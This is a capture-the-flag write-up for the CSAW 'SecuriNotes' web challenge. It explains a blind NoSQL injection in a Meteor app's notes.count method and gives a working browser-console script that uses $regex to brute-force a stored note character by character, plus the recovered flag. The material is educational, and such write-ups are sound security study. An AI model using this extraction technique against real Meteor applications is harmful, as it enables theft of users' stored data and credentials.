---
title: "securinotes"
date: 2022-08-14T14:28:16-04:00
draft: false
authors: ["CDT Daniel Chung", "CDT Jalen Morgan"] 
tags: ["csaw", "web"]
---

A meteor vulnerability found in 2019 and using a note storage webpage as your password database...

## Description

You have access to the SecuriNotes application. You overheard your coworker Terry talking about how he uses it as a password manager. What could possibly go wrong...

Author: h34d4ch3, RangeForce

http://web.chal.csaw.io:5002


## TL;DR

The webpage is running meteor, meteor has known blind nosql injection vulnerability. Exploit using web console and get flag.

## Explanation

When messing around with the webpage, we can see that the application is using meteor to add new notes and call the note to be displayed.

```js
Meteor.call("notes.add", {}, console.log) // creates new note and returns -> jELNgdCZxJoZm6TvL
Meteor.call("notes.count", {"_id": "jELNgdCZxJoZm6TvL"}, console.log) // returns -> 1
```

Knowing this, we can write a blind nosql injection bruteforce query. 
https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01



testing stuff here

find the id is the main part

originally thought that finding the id of terry was what we needed
but thats not going to work because we dont know his username

```
Meteor.call('notes.count', {'body': 'flag'}, (err, res))
```

Looking into app.js, we can see this function defined:

```
Template.Layout_login.onCreated(function () {
  var self = this;
  this.notescount = new ReactiveVar(0);

  function noteCountUpdater() {
    Meteor.call('notes.count', {
      body: {
        $ne: ''
      }
    }, function (err, res) {
      //console.log(res)
      self.notescount.set(res);
    });
```


```
Meteor.call('users.count', (err, res) => {
  console.log(res);
});
```

https://book.hacktricks.xyz/pentesting-web/nosql-injection


https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/split
use an index from the string ` abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_`

```
' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split('')
Array(66) [ " ", "{", "}", "_", "0", "1", "2", "3", "4", "5", … ]
```



## Additional reading
- https://stackoverflow.com/questions/21824244/mongodb-regex-searching-issue-in-meteor
- https://www.w3schools.com/jsref/met_win_settimeout.asp
- https://www.netsparker.com/blog/web-security/what-is-nosql-injection/
- https://www.google.com/search?client=firefox-b-1-d&q=meteor+js+nosql+injection
- https://www.neuralegion.com/blog/blind-sql-injection/
- https://owasp.org/www-community/attacks/Blind_SQL_Injection
- https://book.hacktricks.xyz/pentesting-web/nosql-injection


## Final Script

```js
(function exploit(field, alphabet, data = '', index = 0){
    Meteor.call('notes.count', {[field]: {$regex: data + alphabet[index]}}, (err, res) => {
        if (res == 0){
            index++;
        } 
        else {
            data += alphabet[index];
            console.log(data, res);
            index = 0;
        }
        if (index >= alphabet.length) {
            console.log("Done", data);
            return;
        }
        setTimeout(function(){exploit(field, alphabet, data, index);});
    });
})
('body', ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split(''), 'flag{');
```

## How does it work?

- calls the notes.count function to check if the substring we have is equal to flag. 
- we start off with the alphabet and our string as flag. 
- we check if res==0 then we increase our index in the alphabet going to the next letter. 
- if res==1 then we add the letter to our flag string and print it out. 
- the alph len check is to prevent out of bounds errors. 
- the timeout sets the loop which is a js thing

<!-- ![exploit](/img/meteorexploit.JPG) -->

## Flag

flag{4lly0Urb4s3}


